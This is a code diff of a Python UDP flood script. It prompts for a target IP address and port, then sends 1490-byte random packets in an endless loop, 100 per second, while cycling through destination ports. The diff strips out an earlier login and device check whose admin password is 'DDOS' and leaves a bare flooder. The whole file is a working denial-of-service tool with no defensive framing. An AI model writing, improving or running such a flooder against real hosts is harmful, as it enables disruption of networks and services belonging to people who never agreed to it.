@@ -1,118 +1,69 @@
 import socket
 import secrets
 import time
-import os
-import ipaddress
 from datetime import datetime
+import ipaddress
 
-# === Authorized Users and Devices ===
-authorized_users = {
-    "user1": {
-        "password": " ",
-        "hostname": " ",
-        "ip": "0.0.0.0",
-        "mac": "00:00:00:00:00:00"
-    },
-    "admin": {
-        "password": "DDOS",
-        "hostname": "DDOS",
-        "ip": "0.0.0.0",
-        "mac": "00:00:00:00:00:00"
-    }
-}
+# Get current time (optional)
+def get_current_time():
+    now = datetime.now()
+    return now.hour, now.minute, now.day, now.month, now.year
 
-# === Helper Functions ===
-def get_local_ip():
-    try:
-        return socket.gethostbyname(socket.gethostname())
-    except:
-        return "Unknown"
-
-def get_mac_address_linux():
-    try:
-        interface = os.popen("ip route show default | awk '/default/ {print $5}'").read().strip()
-        mac = os.popen(f"cat /sys/class/net/{interface}/address").read().strip()
-        return mac
-    except:
-        return "00:00:00:00:00:00"
-
-def log_event(username, result):
-    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    hostname = socket.gethostname()
-    ip = get_local_ip()
-    mac = get_mac_address_linux()
-    with open("access_log.txt", "a") as log:
-        log.write(f"{now} | {username} | Hostname: {hostname} | IP: {ip} | MAC: {mac} | Result: {result}\n")
-
-def get_target():
-    while True:
-        try:
-            ip = input("Enter target IP address (IPv4 or IPv6): ").strip()
-            ip_obj = ipaddress.ip_address(ip)
-            port = int(input("Enter target port (0–65535): "))
-            if 0 <= port <= 65535:
-                return ip, port, ip_obj.version == 6
-            else:
-                print("⚠️ Port out of range. Try again.")
-        except:
-            print("⚠️ Invalid input. Try again.")
-
-# === Authentication and Validation ===
-def authenticate_user():
-    username = input("Username: ").strip()
-    password = input("Password: ").strip()
-    user = authorized_users.get(username)
-    if not user:
-        print("❌ Unauthorized username.")
-        log_event(username, "Unauthorized username")
-        exit(1)
-    if password != user["password"]:
-        print("❌ Incorrect password.")
-        log_event(username, "Wrong password")
-        exit(1)
-    print("✅ Authentication successful.")
-    log_event(username, "Access granted")
-    return username
-
-def validate_device(username):
-    user = authorized_users[username]
-    hostname = socket.gethostname()
-    ip = get_local_ip()
-    mac = get_mac_address_linux()
-
-    if hostname != user["hostname"]:
-        print(f"⛔ Hostname mismatch: {hostname}")
-        exit(1)
-    if ip != user["ip"]:
-        print(f"⛔ IP mismatch: {ip}")
-        exit(1)
-    if mac.lower() != user["mac"].lower():
-        print(f"⛔ MAC mismatch: {mac}")
-        exit(1)
-
-    print("✅ Device validation passed.")
-
-# === Packet Sending ===
-def send_packets(ip, port, is_ipv6, rate=100):
+# Create a UDP socket (IPv4 or IPv6)
+def create_socket(is_ipv6=False):
     family = socket.AF_INET6 if is_ipv6 else socket.AF_INET
     sock = socket.socket(family, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    return sock
+
+# Get valid IP address and determine version
+def get_target_ip():
+    while True:
+        ip = input("Enter target IP address (IPv4 or IPv6): ").strip()
+        try:
+            ip_obj = ipaddress.ip_address(ip)
+            return ip, ip_obj.version == 6  # Returns (IP, is_ipv6)
+        except ValueError:
+            print("Invalid IP address format. Please try again.")
+
+# Get valid port number
+def get_target_port():
+    while True:
+        try:
+            port = int(input("Enter target port number: "))
+            if 0 <= port <= 65535:
+                return port
+            else:
+                print("Port must be between 0 and 65535.")
+        except ValueError:
+            print("Invalid input. Please enter a number.")
+
+# Main function to send packets
+def send_packets(ip, port, rate_limit, is_ipv6=False):
+    sock = create_socket(is_ipv6)
     sent = 0
     try:
         while True:
-            data = secrets.token_bytes(1490)
-            sock.sendto(data, (ip, port))
-            print(f"📦 Sent {sent + 1} packet to {ip}:{port}")
+            data = secrets.token_bytes(1490)  # Generate random bytes
+            sock.sendto(data, (ip, port))  # Send data to the target IP and port
             sent += 1
-            port = (port + 1) % 65536
-            time.sleep(1 / rate)
+            port = (port + 1) % 65536  # Increment port number and wrap around
+            print(f"Sent {sent} packet to {ip} on port {port}")
+            time.sleep(1 / rate_limit)  # Rate limiting
+    except socket.error as e:
+        print(f"Socket error: {e}")
     except KeyboardInterrupt:
-        print("🛑 Packet sending stopped.")
+        print("Packet sending stopped by user.")
     finally:
         sock.close()
 
-# === Main Flow ===
 if __name__ == "__main__":
-    username = authenticate_user()
-    validate_device(username)
-    target_ip, target_port, is_ipv6 = get_target()
-    send_packets(target_ip, target_port, is_ipv6)
+    get_current_time()  # Optional: Get current time
+
+    # User input
+    target_ip, is_ipv6 = get_target_ip()  # Get target IP and determine if it's IPv6
+    target_port = get_target_port()  # Get target port
+    rate_limit = 100  # packets per second
+
+    # Start sending packets
+    send_packets(target_ip, target_port, rate_limit, is_ipv6)
